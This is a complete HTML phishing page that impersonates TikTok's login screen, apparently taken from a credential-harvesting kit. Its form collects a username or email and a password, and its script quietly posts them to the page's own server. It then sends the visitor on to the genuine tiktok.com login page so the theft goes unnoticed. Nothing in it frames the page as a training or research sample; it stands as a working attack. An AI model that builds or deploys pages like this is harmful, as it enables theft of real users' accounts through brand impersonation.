<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>TikTok - Login</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#121212;color:white}.container{display:flex;justify-content:center;align-items:center;min-height:100vh}.box{background:#121212;width:375px;padding:32px;text-align:center}.logo{margin-bottom:40px;font-size:32px;font-weight:700;color:#fe2c55}.title{font-size:28px;font-weight:700;margin-bottom:8px}.sub{color:#8a8a8a;font-size:14px;margin-bottom:24px}input{width:100%;padding:14px;background:#1a1a1a;border:1px solid #2f2f2f;border-radius:8px;color:white;font-size:16px;margin-bottom:12px;outline:none}input:focus{border-color:#fe2c55}input[type="submit"]{background:#fe2c55;color:white;border:none;font-weight:700;font-size:16px;cursor:pointer;margin-top:12px}input[type="submit"]:hover{background:#e8254a}.link{color:#8a8a8a;font-size:14px;margin-top:20px}.link a{color:#fe2c55;text-decoration:none;font-weight:600}.link a:hover{text-decoration:underline}</style></head><body><div class="container"><div class="box"><div class="logo">TikTok</div><div class="title">Log in</div><div class="sub">Manage your account, check notifications, comment on videos, and more.</div><form method="POST"><input type="text"name="username"placeholder="Username or email"required><input type="password"name="password"placeholder="Password"required><input type="submit"value="Log in"></form><div class="link">Don't have an account? <a href="#">Sign up</a></div></div></div><script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('',{method:'POST',body:new FormData(this)}).then(function(){window.location.href='https://www.tiktok.com/login';});});</script></body></html>
